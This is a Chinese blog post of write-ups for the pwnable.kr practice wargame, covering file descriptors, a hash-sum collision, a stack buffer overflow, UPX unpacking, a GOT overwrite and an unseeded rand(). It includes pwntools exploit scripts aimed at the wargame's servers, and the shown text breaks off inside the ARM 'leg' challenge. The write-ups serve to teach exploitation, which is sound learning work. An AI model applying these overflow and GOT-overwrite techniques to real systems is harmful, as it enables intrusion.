<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">
  <link rel="mask-icon" href="/images/favicon/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/images/favicon/site.webmanifest">

<link rel="stylesheet" href="/css/tailwind.css">
<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Vollkorn+SC:300,300italic,400,400italic,500,500italic,700,700italic%7CNoto+Sans+SC:300,300italic,400,400italic,500,500italic,700,700italic%7CNoto+Serif+SC:300,300italic,400,400italic,500,500italic,700,700italic&display=swap&subset=latin,latin-ext">

<script src="https://kit.fontawesome.com/b2a94976e7.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.kyrios.cn","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="之后大概会更新这个叫做 pwnable 的专题，顺便记录我在 pwn 这条路上的学习历程">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwnable.kr Study Notes">
<meta property="og:url" content="https://blog.kyrios.cn/2017-pwnablekr-notes/">
<meta property="og:site_name" content="Kyr1os&#39; Blog">
<meta property="og:description" content="之后大概会更新这个叫做 pwnable 的专题，顺便记录我在 pwn 这条路上的学习历程">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/pwnablekr.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/fd00.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/fd01.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/fd02.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/col2.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/col3.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/bof2.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/upx1.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/upx0.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/upx2.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/passcode.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/pass01.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/pass02.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/pass04.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/ran02.jpg">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/leg0.png">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/mistake00.png">
<meta property="og:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/unlink00.png">
<meta property="article:published_time" content="2017-04-08T13:07:16.000Z">
<meta property="article:modified_time" content="2023-01-10T10:35:13.817Z">
<meta property="article:author" content="Kyr1os">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.kyrios.cn/2017-pwnablekr-notes/img/pwnablekr.jpg">


<link rel="canonical" href="https://blog.kyrios.cn/2017-pwnablekr-notes/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://blog.kyrios.cn/2017-pwnablekr-notes/","path":"2017-pwnablekr-notes/","title":"Pwnable.kr Study Notes"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Pwnable.kr Study Notes | Kyr1os' Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Kyr1os' Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">May the wind guide your road</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Friends</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar animated fadeInUp">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#question1fd"><span class="nav-number">1.</span> <span class="nav-text">Question1：fd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup"><span class="nav-number">1.1.</span> <span class="nav-text">Writeup：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question2collision"><span class="nav-number">2.</span> <span class="nav-text">Question2：collision</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-1"><span class="nav-number">2.1.</span> <span class="nav-text">Writeup：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question3bof"><span class="nav-number">3.</span> <span class="nav-text">Question3：bof</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-2"><span class="nav-number">3.1.</span> <span class="nav-text">Writeup：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question4flag"><span class="nav-number">4.</span> <span class="nav-text">Question4：flag</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-3"><span class="nav-number">4.1.</span> <span class="nav-text">Writeup:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question5passcode"><span class="nav-number">5.</span> <span class="nav-text">Question5：passcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-4"><span class="nav-number">5.1.</span> <span class="nav-text">Writeup：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question6random"><span class="nav-number">6.</span> <span class="nav-text">Question6：random</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-5"><span class="nav-number">6.1.</span> <span class="nav-text">Writeup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question7leg"><span class="nav-number">7.</span> <span class="nav-text">Question7：leg</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-6"><span class="nav-number">7.1.</span> <span class="nav-text">Writeup：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c"><span class="nav-number">7.2.</span> <span class="nav-text">C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asm"><span class="nav-number">7.3.</span> <span class="nav-text">asm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question8mistake"><span class="nav-number">8.</span> <span class="nav-text">Question8：mistake</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-7"><span class="nav-number">8.1.</span> <span class="nav-text">Writeup：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question9shellshock"><span class="nav-number">9.</span> <span class="nav-text">Question9：shellshock</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-8"><span class="nav-number">9.1.</span> <span class="nav-text">Writeup:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#prerequisite"><span class="nav-number">9.2.</span> <span class="nav-text">Prerequisite:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">9.3.</span> <span class="nav-text">Solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#question10-unlink"><span class="nav-number">10.</span> <span class="nav-text">Question10: unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#writeup-9"><span class="nav-number">10.1.</span> <span class="nav-text">Writeup:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#prerequisition"><span class="nav-number">10.2.</span> <span class="nav-text">Prerequisition</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution-1"><span class="nav-number">10.3.</span> <span class="nav-text">Solution</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Kyr1os"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Kyr1os</p>
  <div class="site-description" itemprop="description">Each day is a blessing</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/kyrios0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kyrios0" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:kyr1os@qq.com" title="E-Mail → mailto:kyr1os@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://osu.ppy.sh/users/11500292" title="OSU → https:&#x2F;&#x2F;osu.ppy.sh&#x2F;users&#x2F;11500292" rel="noopener me" target="_blank"><i class="fa fa-headphones fa-fw"></i>OSU</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://blog.kyrios.cn/2017-pwnablekr-notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Kyr1os">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Kyr1os' Blog">
      <meta itemprop="description" content="Each day is a blessing">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Pwnable.kr Study Notes | Kyr1os' Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Pwnable.kr Study Notes
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2017-04-08 21:07:16" itemprop="dateCreated datePublished" datetime="2017-04-08T21:07:16+08:00">2017-04-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-01-10 18:35:13" itemprop="dateModified" datetime="2023-01-10T18:35:13+08:00">2023-01-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><hr />
<center>
之后大概会更新这个叫做 pwnable 的专题，顺便记录我在 pwn
这条路上的学习历程
</center>
<hr />
<p><img src="img/pwnablekr.jpg" style="max-height: 480px;"></p>
<p>学习的网站是<a target="_blank" rel="noopener" href="http://pwnable.kr">pwnable.kr</a>，你可能需要翻墙</p>
<p>P.S. 并没有严格按网站上的顺序做题</p>
<hr />
<h2 id="question1fd">Question1：fd</h2>
<blockquote>
<p>Mommy! what is a file descriptor in Linux?</p>
</blockquote>
<blockquote>
<p>* try to play the wargame your self but if you are ABSOLUTE beginner,
follow this tutorial link:
https://www.youtube.com/watch?v=blAxTfcW9VU</p>
</blockquote>
<blockquote>
<p>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<h3 id="writeup">Writeup：</h3>
<p>首先连接 ssh，查看目录发现一份C语言代码</p>
<p><img src="img/fd00.jpg" /></p>
<p>简单的解释一下，这个程序输入的第一个参数仅接受数字输入，将输入的第一个参数的值减去
0x1234 后将其作为 read 函数的第一个参数，此条件下 read
函数将接受输入的第二个参数。然后是一个关于第二个参数的字符串匹配，匹配成功就拿到
flag。</p>
<p>查到 fd 的文档</p>
<p><img src="img/fd01.jpg" /></p>
<p>可以看到当 fd=0 时，read 函数可以读 stdin
里的数据，所以输入的第一个参数就应该是 0x1234+0=4660.
考虑到后面的字符串匹配，第二个参数输入 "LETMEWIN"。成功拿到 flag。</p>
<p><img src="img/fd02.jpg" /></p>
<hr />
<h2 id="question2collision">Question2：collision</h2>
<blockquote>
<p>Daddy told me about cool MD5 hash collision today. I wanna do
something like that too!</p>
</blockquote>
<blockquote>
<p>ssh col@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<h3 id="writeup-1">Writeup：</h3>
<p>看到 MD5 碰撞吓了一跳（明明才第二题，所以其实并没有）。连接
ssh，查看目录发现一份 C 语言代码</p>
<p><img src="img/col2.jpg" /></p>
<p>整个程序很清晰，需要输入一个长度为 20 的字符串，将输入字符串转换为
int 传给 check_password 函数做运算，如果函数返回值 = 0x21DD09EC 则给
flag。</p>
<p>观察 check_password 函数发现，它把参数以四个字节的长度（int 长度为 4
字节）分割后再全部相加返回 unsigned long 的总和（unsigned long 在 32/64
位环境对应 4/8 字节，从题目看应该是 4 字节）。因为输入的字符串是 20
字节，所以就是把字符串分成 5 份然后加起来。</p>
<p>在加法运算中我们知道，如果不考虑进位的话，aa+bb=(a+b)(a+b)，比如
11+22=33，这对任何进制都是有效的。因为我们只能以字节为基本单位来输入，所以我们以字节为单位来分析，结果
res 中的第 i 个字节的值其实等于被分割后的输入字符串的第i个字符的值的总和
sum-n*0xff
左右（考虑到进位）。因为目标机是小端序，所以这个对应顺序要反一转。举个例子，把
check_password 函数写在本地编译执行，传入字符串
abcdabcdabcdabcdabcd，输出结果 0xf5f0ebe5，其中
0xe5=0x61(a)*5-0xff，0xeb=0x62(b)*5-0xff-1
(前一项进位)，0xf0=0x63(c)*5-0xff-1 (前一项进位)，0xf5=0x64(d)*5-0xff-1
(前一项进位)。</p>
<p>所以可以据此对 0x21DD09EC 进行逐字节碰撞，翻出 ascii 码表根据
sum[i]-n*0xff≈res[5-i] (i=1,2,3,4) 确定大概范围，然后再进行正负 2
以内的微调抵消进位就可以了。</p>
<p>最后我构造的字符串为 "dh_9bh_:bh_9bh_:bh_:"，拿到 flag。</p>
<p><img src="img/col3.jpg" /></p>
<hr />
<h2 id="question3bof">Question3：bof</h2>
<blockquote>
<p>Nana told me that buffer overflow is one of the most common software
vulnerability. Is that true?</p>
</blockquote>
<blockquote>
<p>Download : http://pwnable.kr/bin/bof Download :
http://pwnable.kr/bin/bof.c</p>
</blockquote>
<blockquote>
<p>Running at : nc pwnable.kr 9000</p>
</blockquote>
<hr />
<h3 id="writeup-2">Writeup：</h3>
<p>题目说的很清楚这是一个简单粗暴的缓冲区溢出（然而还不是花了一堆时间来装
edb，这篇文章隔壁有安装心得） 这次给了一份 C 代码和一个 elf
程序，给的代码如下 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 很明确我们应该通过这个无限制的 gets()
来把 key 的值从 0xdeadbeef 覆写为 0xcafebabe
为了查看栈的状态我们把它扔进 edb 里 <img src="img/bof2.jpg" />
这里我随便输了点东西进去（1234...），因为它的变量原本存的是
0xdeadbeef，所以我们找到这个值的地址和我们输入的地址作分析。
可以从上图看出中间差了 52 字节，可以构造 52 字节的垃圾数据加上
0xcafebabe 作为输入即可 exp： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;pwnable.kr&#x27;, 9000)</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;a&#x27; * 52 + &#x27;\xbe\xba\xfe\xca&#x27; + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure> 拿到 shell <img
src="img/bof3.jpg" /></p>
<hr />
<h2 id="question4flag">Question4：flag</h2>
<blockquote>
<p>Papa brought me a packed present! let's open it.</p>
</blockquote>
<blockquote>
<p>Download : http://pwnable.kr/bin/flag</p>
</blockquote>
<blockquote>
<p>This is reversing task. all you need is binary</p>
</blockquote>
<h3 id="writeup-3">Writeup:</h3>
<p>逆向题。 记事本打开</p>
<p><img src="img/upx1.jpg" /></p>
<p>看到 upx 壳。</p>
<p>扔进终端 <strong>upx -d flag</strong></p>
<p>脱掉过后扔进 ida</p>
<p><img src="img/upx0.jpg" /></p>
<p>看到程序会 malloc 一段内存，然后将 flag 拷贝进去。 打开 edb，执行到
malloc，监视这段地址，直到后面 strcpy 执行完毕后可以看到 flag</p>
<p><img src="img/upx2.jpg" /></p>
<hr />
<h2 id="question5passcode">Question5：passcode</h2>
<blockquote>
<p>Mommy told me to make a passcode based login system. My initial C
code was compiled without any error! Well, there was some compiler
warning, but who cares about that?</p>
</blockquote>
<blockquote>
<p>ssh passcode@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<h3 id="writeup-4">Writeup：</h3>
<p>连接过后拿到一份源码</p>
<p><img src="img/passcode.jpg" /></p>
<p>login() 里面对两个 passcode
输入是有问题的。但是一时又不知道如何利用。</p>
<p>仔细分析第一次在 welcome()
里面的输入，输入的字符串是函数内的局部变量，当函数调用结束，这个变量就会失去价值，变为栈里的残留数据。那我们能不能通过控制这个残留的数据来影响到
login() 当中的 passcode呢？</p>
<p>接下来用 edb 加载程序查看一下堆栈情况。 我们首先运行到输入 passcode1
的位置 <img src="img/pass01.jpg" /></p>
<p>passcode1 随便输入一个值，然后 scanf 会将未初始化的 passcode1
的值作为一个地址去寻址，这里程序多半会挂，我们看这时的栈空间。 <img
src="img/pass00.jpg" /></p>
<p>这时程序已经挂了，原因是不能访问 <strong>0xf75becab</strong>
这个地址。 在图中我们可以看到 <strong>0xff9acb88</strong> 是之前
<strong>welcome() 里输入数据的残留</strong>。而
<strong>0xff9acbe8</strong> 这里就是 <strong>passcode1
的地址</strong>，它们中间的偏移值是 0x60 = <strong>96</strong>。算上一个
32 位的地址占用 4 个字节。刚好能满足 96 + 4 = 100，即 name[]
的占用空间。</p>
<p>能操控 passcode1 里的数据后我们就能往<strong>任意地址写入</strong> 4
字节的数据。 方便起见，这里选择往 fflush() 的 GOT
表里面写入登陆成功那段代码的地址。这样在输入 passcode1
后，紧跟着就能执行登录成功代码拿到 flag。</p>
<p>所以进 IDA 查了一下 GOT 表信息，找到了 fflush() 的 GOT 表地址 <img
src="img/pass03.jpg" /></p>
<p>然后是查看 loginOK 那段代码的地址 <img src="img/pass02.jpg" /></p>
<p>这里往 GOT 表写 <strong>0x080485d7</strong> 或者
<strong>0x080485e3</strong>
都是可以的，因为我本地调试的时候想要个回显，所以我写的是
0x080485d7（0x080485d7=134514135）</p>
<p>根据以上写出 payload <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">passcode_ssh = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">p = passcode_ssh.process(executable = <span class="string">&quot;./passcode&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">96</span> + <span class="string">&#x27;\x04\xa0\x04\x08&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;134514135&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvall()</span><br></pre></td></tr></table></figure></p>
<p><img src="img/pass04.jpg" /></p>
<hr />
<h2 id="question6random">Question6：random</h2>
<blockquote>
<p>Daddy, teach me how to use random value in programming!</p>
</blockquote>
<blockquote>
<p>ssh random@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<h3 id="writeup-5">Writeup</h3>
<p>大水题，之后大概会把 pwnable 的文章整合一下。 下载代码 <img
src="ran00.jpg" /></p>
<p>看到这里的随机数生成器没有添加种子，所以每次生成的数是一样的。</p>
<p>扔进 edb，跑到 rand()，看一下 eax 里存放的返回值 <img
src="ran01.jpg" /></p>
<p>根据异或的原理解一下 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6b8b4567 ^ 0xdeadbeef = 3039230856</span><br></pre></td></tr></table></figure></p>
<p>exp: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">random_ssh = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;random&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"></span><br><span class="line">p = random_ssh.process(executable = <span class="string">&quot;./random&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;3039230856&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recvall()</span><br></pre></td></tr></table></figure></p>
<p><img src="img/ran02.jpg" /></p>
<hr />
<h2 id="question7leg">Question7：leg</h2>
<blockquote>
<p>Daddy told me I should study ARM. But I prefer to study my leg!</p>
</blockquote>
<blockquote>
<p>Download : http://pwnable.kr/bin/leg.c Download :
http://pwnable.kr/bin/leg.asm</p>
</blockquote>
<blockquote>
<p>ssh leg@pwnable.kr -p2222 (pw:guest)</p>
</blockquote>
<hr />
<h3 id="writeup-6">Writeup：</h3>
<p>题目给了一份源码一份反汇编代码</p>
<h3 id="c">C</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key=0;</span><br><span class="line">	printf(&quot;Daddy has very strong ARM! 